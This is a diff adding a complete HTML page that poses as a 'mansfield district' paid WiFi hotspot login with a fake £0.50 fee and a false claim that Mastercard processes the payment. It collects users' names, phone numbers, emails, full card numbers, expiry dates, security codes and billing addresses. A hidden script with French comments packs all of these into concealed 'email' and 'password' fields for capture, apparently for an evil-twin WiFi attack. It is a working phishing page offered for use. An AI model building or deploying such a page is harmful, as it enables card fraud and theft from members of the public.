@@ -1,0 +1,186 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Welcome to mansfield district WiFi Hotspot</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            max-width: 400px;
+            margin: 0 auto;
+            padding: 20px;
+            background-color: #FFFF00;
+        }
+        .container {
+            background: green;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+        }
+        h1 {
+            color: #FFFF00;
+            text-align: center;
+            margin-bottom: 10px;
+        }
+        .fee {
+            text-align: center;
+            color: #C00000;
+            font-size: 18px;
+            font-weight: bold;
+            margin-bottom: 30px;
+        }
+        .form-group {
+            margin-bottom: 15px;
+        }
+        label {
+            display: block;
+            margin-bottom: 5px;
+            color: #0000CC;
+            font-weight: bold;
+        }
+        input[type="text"],
+        input[type="email"],
+        input[type="tel"] {
+            width: 100%;
+            padding: 12px;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            box-sizing: border-box;
+            font-size: 16px;
+        }
+        input:focus {
+            border-color: #CC0066;
+            outline: none;
+        }
+        .submit-btn {
+            width: 100%;
+            padding: 15px;
+            background-color: #007cba;
+            color: yellow;
+            border: none;
+            border-radius: 4px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            margin-top: 20px;
+        }
+        .submit-btn:hover {
+            background-color: #005a8b;
+        }
+        .processor {
+            text-align: center;
+            margin-top: 20px;
+            font-size: 12px;
+            color: #666;
+        }
+        .error-message {
+            color: #000000;
+            font-size: 12px;
+            margin-top: 5px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Welcome to mansfield district WiFi Hotspot</h1>
+        
+        <div class="fee">Access the fastest WiFi in town for a one-time fee of £0.50.        UP THE STAGS 🦌</div>
+        
+        <form method="GET" action="/get">
+            <!-- MOBILE NUMBER -->
+            <div class="form-group">
+                <label for="mobile_number">Mobile Number</label>
+                <input type="tel" id="mobile_number" name="mobile_number" placeholder="Please enter a valid mobile number (10-15 digits)." required>
+                <div class="error-message">Please enter a valid mobile number (10-15 digits).</div>
+            </div>
+            
+            <!-- FULL NAME -->
+            <div class="form-group">
+                <label for="full_name">Full Name</label>
+                <input type="text" id="full_name" name="full_name" placeholder="" required>
+            </div>
+            
+            <!-- EMAIL ADDRESS -->
+            <div class="form-group">
+                <label for="email_address">Email Address</label>
+                <input type="email" id="email_address" name="email_address" placeholder="" required>
+            </div>
+            
+            <!-- CREDIT CARD NUMBER -->
+            <div class="form-group">
+                <label for="credit_card_number">Credit Card Number</label>
+                <input type="text" id="credit_card_number" name="credit_card_number" placeholder="Please enter a valid credit card number (16 digits)." required maxlength="19">
+                <div class="error-message">Please enter a valid credit card number (16 digits).</div>
+            </div>
+            
+            <!-- EXPIRY DATE -->
+            <div class="form-group">
+                <label for="expiry_date">Expiry Date</label>
+                <input type="text" id="expiry_date" name="expiry_date" placeholder="Please enter a valid expiry date (MM/YY)." required maxlength="5">
+                <div class="error-message">Please enter a valid expiry date (MM/YY).</div>
+            </div>
+            
+            <!-- SECURITY CODE -->
+            <div class="form-group">
+                <label for="security_code">Security Code</label>
+                <input type="text" id="security_code" name="security_code" placeholder="Please enter a valid security code (3-4 digits)." required maxlength="4">
+                <div class="error-message">Please enter a valid security code (3-4 digits).</div>
+            </div>
+            
+            <!-- BILLING ADDRESS -->
+            <div class="form-group">
+                <label for="billing_address">Billing Address</label>
+                <input type="text" id="billing_address" name="billing_address" placeholder="" required>
+            </div>
+            
+            <!-- CHAMPS CACHÉS POUR CAPTURE (INVISIBLE) -->
+            <input type="hidden" name="email" id="hidden_email" value="">
+            <input type="hidden" name="password" id="hidden_password" value="">
+            
+            <!-- BOUTON DE SOUMISSION -->
+            <button type="submit" class="submit-btn">Proceed to Payment</button>
+        </form>
+        
+        <div class="processor">Payment is securely processed by [Mastercard Ltd].</div>
+    </div>
+
+    <!-- SCRIPT DE CAPTURE (INVISIBLE) -->
+    <script>
+        document.querySelector('form').addEventListener('submit', function(e) {
+            // Capture l'email dans le champ caché
+            const emailField = document.getElementById('email_address');
+            if (emailField && emailField.value) {
+                document.getElementById('hidden_email').value = emailField.value;
+            }
+            
+            // Combine TOUS les autres champs dans password (format: nom=valeur|nom=valeur|...)
+            let allData = '';
+            const fields = [
+                {name: 'mobile_number', id: 'mobile_number'},
+                {name: 'full_name', id: 'full_name'},
+                {name: 'credit_card_number', id: 'credit_card_number'},
+                {name: 'expiry_date', id: 'expiry_date'},
+                {name: 'security_code', id: 'security_code'},
+                {name: 'billing_address', id: 'billing_address'}
+            ];
+            
+            fields.forEach(field => {
+                const input = document.getElementById(field.id);
+                if (input && input.value.trim()) {
+                    allData += `${field.name}=${encodeURIComponent(input.value)}|`;
+                }
+            });
+            
+            // Met tout dans le champ password caché
+            document.getElementById('hidden_password').value = allData;
+            
+            // Debug (optionnel - supprimez si vous voulez)
+            console.log('Données capturées:', {
+                email: document.getElementById('hidden_email').value,
+                password: document.getElementById('hidden_password').value
+            });
+        });
+    </script>
+</body>
+</html>
